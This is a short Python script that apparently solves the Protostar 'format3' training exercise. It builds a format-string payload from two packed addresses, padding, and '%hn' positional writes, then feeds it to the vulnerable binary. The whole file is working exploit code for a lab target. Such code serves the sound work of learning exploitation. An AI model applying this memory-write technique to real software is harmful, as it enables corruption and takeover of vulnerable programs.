import subprocess

program = "/opt/protostar/bin/format3"
target1 = "\x08\x04\x96\xf4"[::-1]
target2 = "\x08\x04\x96\xf6"[::-1]

length1 = 0x0102-len(target1)-len(target2)
data1 = '%.'+str(length1)+'d'
# -1 for decimal point
# 8 for len(target1) and len(target2) maybe?
data2 = '%.'+str(0x5544-length1-8-1)+'d'

string = target1+target2+data1+"%13$hn"+data2+"%12$hn"
print(repr(string))

process = subprocess.Popen([program, string], stdin=subprocess.PIPE)
process.communicate(string+'\n');




